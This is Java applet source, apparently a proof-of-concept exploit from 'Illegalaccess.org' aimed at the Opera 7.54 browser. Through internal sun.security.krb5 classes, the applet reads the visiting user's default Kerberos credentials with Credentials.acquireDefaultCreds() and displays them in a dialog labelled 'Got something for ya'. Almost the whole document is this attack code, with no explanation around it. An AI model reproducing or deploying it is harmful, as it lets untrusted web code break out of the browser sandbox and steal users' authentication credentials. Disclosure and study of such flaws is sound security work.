import sun.security.krb5.*;

public class Opera754KerberosAppletPrint extends java.applet.Applet{

   public void start() {

        int j =
javax.swing.JOptionPane.showConfirmDialog(null,"Illegalaccess.org | Step1
Opera 754 FontCrash, wanna crash? ");
        System.out.println(j);
        try {
        Credentials c =  Credentials.acquireDefaultCreds();

        System.out.println(c);
        j =
javax.swing.JOptionPane.showConfirmDialog(null,"Illegalaccess.org |Got
something for ya"+c);

        }
        catch (Exception e) {
        j = javax.swing.JOptionPane.showConfirmDialog(null,e.toString());

        }
   }

}
